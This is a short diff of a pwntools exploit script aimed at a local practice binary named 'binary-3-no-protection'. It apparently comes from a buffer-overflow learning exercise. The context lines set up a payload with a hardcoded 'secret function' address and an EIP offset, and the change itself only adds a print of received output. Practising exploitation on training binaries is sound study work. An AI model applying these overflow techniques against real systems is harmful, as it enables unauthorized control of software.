@@ -11,6 +11,8 @@ pty = process.PTY
 elf = context.binary = ELF("./binaries/binary-3-no-protection")
 p = process(elf.path)
 
+print(p.recvline())
+
 print("Craft payload")
 address_of_secret_function = 0x80491b6
 offset_eip = 20
